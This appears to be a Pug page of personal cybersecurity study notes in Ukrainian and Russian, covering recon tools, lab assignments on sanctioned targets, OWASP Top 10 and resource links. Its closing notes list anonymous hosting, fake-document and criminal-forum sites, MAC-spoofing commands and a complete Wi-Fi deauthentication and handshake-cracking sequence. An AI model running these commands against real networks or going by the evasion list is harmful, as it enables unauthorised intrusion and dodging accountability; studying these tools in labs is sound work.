        <em>Етапи етичного хакінгу:</em><br>
        - Reconnaissance (розвідка)<br>
        - Scanning & Enumeration (сканування)<br>
        - Gaining Access (отримання доступів)<br>
        - Maintaining Access (обслуговування доступів)<br>
        - Covering Tracks (приховання слідів)<br>

      //- Reconnaissance
      details
        summary Reconnaissance

        //- Dig & Whois
        details
            summary Dig & Whois
            p.
              <dfn>Dig</dfn>
              - Утиліта Unix-систем, що надає користувачеві інтерфейс командного рядка для звернення до системи DNS (DNS-клієнт). <br>
              - Dig англійською значить «копати», але формально — це скорочення від «domain information groper». <br>
              - Дозволяє задавати різні типи запитів i запитувати довільно вказані сервера. Має більше можливостей ніж подібна утиліта nslookup.<br>
            br
            p.
              <dfn>WHOIS</dfn>
              - Протокол запит/відповідь, що базується на TCP. 
              - Широко використовується для запитів бази даних для того, щоб визначити власника доменної зони, IP-адреси , або автономного системного номера в Інтернеті.

        //- Nmap & Gobuster  
        details
          summary Nmap & Gobuster
          p.
            Gobuster - пояснення з прикладами
            https://www.geeksforgeeks.org/gobuster-penetration-testing-tools-in-kali-tools/
          
            Nmap Cheat Sheet 2023: All the Commands, Flags & Switches
            https://www.stationx.net/nmap-cheat-sheet/
          
            Віртуалізація проти контейнеризації
            https://www.trianz.com/insights/containerization-vs-virtualization#:~:text=Virtualization%20aims%20to%20run%20multiple,to%20run%20multiple%20processes%20simultaneously
          
            Завдання 1
            * За допомогою nmap проскануйте scanme.nmap.org. 
            * Спочатку зробіть скан з параметрами по замовчуванням (тільки додайте запис в файл), потім додайте ключі -sC, -sV та проскануйте ВСІ порти. 
            * Вивід також перенаправте у файл. 
            * Надішліть 2 файла з результатами скану.
          
            Завдання 2
            * Зареєструйтеся та авторизуйтесь на порталі https://portal.offsec.com/sign-up/pg .
            * Підтвердіть пошту та завершіть покупку безкоштовного курсу (номера телефонів можна вказувати будь-які, кредитну картку не питає). Після завершення покупки вам буде доступний кабінет користувача.
            * Запустіть сканер dirb, dirbuster, gobuster чи аналогічний. В якості словника використовуйте цей. Розширте пошук на php, txt, pdf та zip файли. 
            * Прикріпіть скріншот або скріншоти, на яких видно параметри з якими ви запускали сканер та ресурси, якій він знайшов.
          
            Для запуску:
            завантажте vpn файл доступу
            підключіться до vpn на віртуальній машині kali linux
            sudo openvpn universal.ovpn
            після успішного підключення має загорітись зелений індикатор
            запустіть машину, наприклад під назвою FunboxEasyEnum
            після успішного старту вам дадуть ip-адресу цієї машини
          img(src="./img/web/nmap.png" alt="")
                        
        //- DAST
        details
          summary DAST
          p.
            Динамічне тестування безпеки додатків (DAST)
            - Процес тестування веб-додатків через веб-інтерфейс для пошуку вразливостей.
            - Додаткова інформація
            https://www.rapid7.com/fundamentals/dast/
            https://www.microfocus.com/en-us/what-is/dast                            
          img src="./img/web/DFD.png" alt="")
          img src="./img/web/ERD.png" alt="")
          img src="./img/web/UML.png" alt="")
          img src="./img/web/OSINT.png" alt="")
          img src="./img/web/Sens.png" alt="")
          img src="./img/web/subfinder.png" alt="")

    //- Resources
    details
      summary Resources                                    
      a(href="https://www.hacker101.com/") hacker101 <br>
      a(href="https://portswigger.net/web-security/all-labs") portswigger <br>
      a(href="https://www.root-me.org/?lang=en") root-me <br>
      a(href="https://www.hackerone.com/") hackerone <br>
      a(href="https://www.hackthebox.com/") hackthebox <br>
      a(href="https://www.globalknowledge.com/ca-en/topics/cybersecurity/glossary-of-terms/") glossary  <br>
      a(href="https://www.microsoft.com/uk-ua/security/business/security-101") microsoft  <br>
      a(href="https://kr-labs.com.ua/blog/testuvannya-na-pronyknennya-pentest-vid-a-do-ya/") kr-labs  <br>
      a(href="https://en.wikipedia.org/wiki/Information_security") IS  <br>
      a(href="https://en.wikipedia.org/wiki/Information_security_standards") Information_security_standards  <br>
      a(href="https://en.wikipedia.org/wiki/NIST_Cybersecurity_Framework") NIST_Cybersecurity_Framework  <br>
      a(href="https://umbrella.cisco.com/blog/cisco-umbrella-top-10-cybersecurity-tips") umbrella  <br>
      a(href="https://www.amazon.com/Routing-Switching-200-125-Official-Library/dp/1587205815") amazon   <br>
      br
      a(href="https://github.com/danielmiessler/SecLists") SecLists <br>
      a(href="https://github.com/swisskyrepo/PayloadsAllTheThings/") PayloadsAllTheThings <br>
      br
      a(href="https://medium.com/@d.harish008/what-is-a-magic-byte-and-how-to-exploit-1e286da1c198") byte <br>
      a(href="https://www.dcode.fr/tools-list") tools <br>
      a(href="https://www.coursera.org/learn/crypto") crypto <br>
      br
      a(href="https://www.cdn77.com/tls-test") cdn77 <br>
      a(href="https://www.ssllabs.com/ssltest/") ssltest <br>
      a(href="https://demo.owasp-juice.shop/#/") juice <br>
      a(href="https://bugcrowd.com/vulnerability-rating-taxonomy") bugcrowd<br>
      br
      a(href="https://cwe.mitre.org/") cwe<br>
      a(href="https://hackyourmom.com/") hackyourmom<br>
      a(href="https://hackcontrol.org/") hackcontrol<br>
      a(href="https://www.youtube.com/@gauravladekar/videos") kali<br>
      a(href="https://simplifiedprivacy.com/") simplifiedprivacy<br>
      br
      a(href="https://project-zero.issues.chromium.org/issues?q=") issues<br>
      a(href="https://www.shodan.io/") - веб-сканер устройств IoT, который поможет вам определить любые уязвимые устройства в Интернете.<br>
      p Wifi:<br>
      a(href="https://www.krackattacks.com/") krackattacks<br>
      a(href="https://www.fcc.gov/consumers/guides/how-protect-yourself-online") Wifi<br>
      a(href="https://pages.nist.gov/800-63-3/") Wifi<br>
      a(href="https://www.snort.org/") Net<br>
      p.
        Базы
        Одной из наиболее известных и уважаемых организаций по обучению кибербезопасности является Институт SANS.<br>
      a(href="https://www.sans.org/about/") SANS<br>
      p.
        <em>Форумом групп реагирования на инциденты по кибербезопасности (FIRST)</em>,<br>
        <em>Национальным обменом информацией по безопасности (NSIE)</em>,<br>
        <em>Обменом информации об оборонной безопасности (DSIE)</em> и<br>
        <em>Центром анализа и исследования операций DNS (DNS-OARC)</em>.<br>
        <dfn>Black Hat</dfn> — хакери, які прагнуть виконувати зловмисні дії.<br>
        <dfn>Gray Hat</dfn> — хакери, які виконують корисні та/або зловмисні.<br>
        <dfn>White Hat</dfn> — етичні хакери, вони застосовують свої навички для покращення стану безпеки викриваючи вразливості компаній/організацій.<br>
        <dfn>Script Kiddie / Skiddies</dfn> — особи без грунтовних навичок, які користуються готовими скриптами/експлойтами для проведення атак на ІТ-системи, додатки, програми тощо.<br>
        <dfn>State-Sponsored Hacker</dfn> — хакери, які найняті державою для спеціалізованих цілей.<br>
        <dfn>Hacktivist</dfn> — особа, яка займається зламами в своїх цілях.<br>
        <dfn>Cyberterrorist</dfn> — релігійно або політико мотивовані активісти, які виконують відповідні дії.<br>
        Команда компьютерной экстренной готовности США (US-CERT, United States Computer Emergency Readiness Team) и Министерство внутренней безопасности США поддерживают базу данных общеизвестных уязвимостей (CVE, Сommon Vulnerabilities and Exposures).
        Каждая запись CVE содержит стандартный идентификационный номер, краткое описание уязвимости и важные ссылки на относящиеся к этой уязвимости отчеты. Список CVE поддерживается некоммерческой организацией MITRE Corporation в актуальном состоянии и является общедоступным на ее веб-сайте.
        Автоматическое распространение признаков (AIS, Automated Indicator Sharing) – это функция Агентства кибербезопасности и безопасности инфраструктуры (CISA, Cybersecurity and Infrastructure Security Agency)
      a(href="https://www.caeepnc.org/social_engineering/")
      p <dfn>OWASP top 10</dfn> є визнаною світовою методологією оцінки вразливостей веб-додатків у всьому світі i відображає сучасні тренди безпеки веб-додатків, є першим кроком організації до створення культури більш безпечного коду програмного забезпечення.<br>
      a(href="https://owasp.org/www-project-top-ten/") Top 10 Web Application Security Risks<br>
      p.
        - Broken Access Control<br>
        - Cryptographic Failures<br>
        - Injection<br>
        - Insecure Design<br>
        - Security Misconfiguration<br>
        - Vulnerable and Outdated Components<br>
        - Identification and Authentication Failures<br>
        - Software and Data Integrity Failures<br>
        - Security Logging and Monitoring Failures<br>
        - Server-Side Request Forgery<br>
      img(src="./img/web/OWASP.png" alt="")
      img(src="./img/web/project.png" alt="")
      img(src="./img/web/projectTask.png" alt="")
      img(src="./img/web/vulnerability.png" alt="")
      img(src="./img/web/AbbiSecur.jpeg" alt="")
      img(src="./img/web/Security.jpeg" alt="")
      br
      a(href="https://www.indeed.com/") indeed<br>
      a(href="https://ua.linkedin.com/") linkedin<br>
      a(href="https://jobs.dou.ua/vacancies/?search=cybersecurity") dou<br>
      a(href="https://www.work.ua/jobs-cybersecurity/") work<br>
      br
      p.
        Zeus
        
        Keyboard Logging, Keylogging

        NetStumbler

        Metasploit -> Meterpreter

        getmonero.org <br>
        Bestchange <br>
        XCHANGE.me <br>
        Shadow socks?  <br>
        tox.chat <br>
        jitsi.org <br>
        mumble.com <br>
        jabber <br>
        secure sim card <br>
        crypton в tor <br>
        mosilla monitor <br>
        <ul>Хостинг
          <li>криптовалюта monero, zcash</li>
          <li>без гугл скриптов</li>
          <li>без cloud flair - облачная защита</li>
          <li>своё зеркало среди анонимных сетей</li>
          <li>страна вне договора 14 глаз</li>
          <li>host4coins.net</li>
          <li>bitVPS.com</li>
          <li>njal.la</li>
          <li>cockbox.org</li>
        </ul>
        IP-телефония <br>
        saveum <br>
        Купить аккаунты телеграмм <br>
        anonimayzer <br>
        yourdigitalrights.org <br>
        Dash cash <br>
        Zcash <br>
        verge currency <br>
        Проверить IP - 2IP.com <br>
        Сменить порт. <br>
        Fail2Ban - защита от брутфорса и DDos. <br>
        changeme <br>
        honeypot <br>
        OpenBSD <br>
        Devuan <br>
        i2p+xmpp <br>
        onlyFake - поддельные документы <br>
        onionmail.org<br>
        cryptwerk.com<br>
        xss.is<br>
        forum.exploit.in<br>
        freemyip.com - левый домен для сервера<br>
        - Information gathering (Reconnaissance)<br>
        - ping<br>
        - whois<br>
        - whatweb 192.168.100.1-192.168.100.255 -a 3 -v --no-errors --log-verbose=result<br>
        - theHarvester -d DOMAIN -b SOURCE (google)<br>
        - hunter.io (find email on domain)<br>
        - Scanning (game started)<br>
        - Gaining access (Exploitation)<br>
        - Maintaining access<br>
        - Covering tracks

        Ifconfig
        ifconfig
        ifconfig eth0 192.168.0.21 netmask 255.255.255.0 broadcast 192.168.0.255

        Ip
        ip a
        ip link set wlan0 down
        ifconfig wlan0 hw ether 14:de:d1:88:18:d4
        ip link set wlan0 up
        ip l


        lshw
        apt install lshw
        lshw -class network

        Ping and Traceroute
        ping ya.ru
        traceroute ya.ru
        traceroute -I ya.ru

        Netstat
        netstat -i
        netstat -lpn
        netstat -r

        MAC
        f8:db:88 - 
        f0:4d:a2 - 
        34:17:eb - 
        ip a
        macchanger -l
        ip link set wlp0s20f3 down
        sudo macchanger -m b2:aa:0e:56:ed:f7 enp0s3
        sudo macchanger -r wlp0s20f3
        sudo ip link set wlp0s20f3 up

        ssh
        sudo apt update
        sudo apt install openssh-server
        sudo systemctl status ssh
        q
        sudo ufw allow ssh
        ip a
        sudo systemctl disable --now ssh
        sudo systemctl enable --now ssh

        WG
        Server:
        curl -O https://raw.githubusercontent.com/angristan/wireguard-install/master/wireguard-install.sh
        chmod +x wireguard-install.sh
        ip -br a - publik IP
        ./wireguard-install.sh

        Client:
        sudo apt install wireguard
        sudo apt install resolvconf iptables
        sudo mv ~/wg0-client-losst.conf /etc/wireguard/wg0.conf
        wg-quick up wg0
        sudo wg show

ip a
iwconfig
airmon-ng stop wlan0
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng wlan0mon --bssid C4:6E:1F:61:B1:0C --channel 6 -w Stalingrad
aireplay-ng wlan0mon --deauth 0 -a C4:6E:1F:61:B1:0C -c clientMacAddr
aircrack-ng Stalingrad-01.cap -w passwordList.txt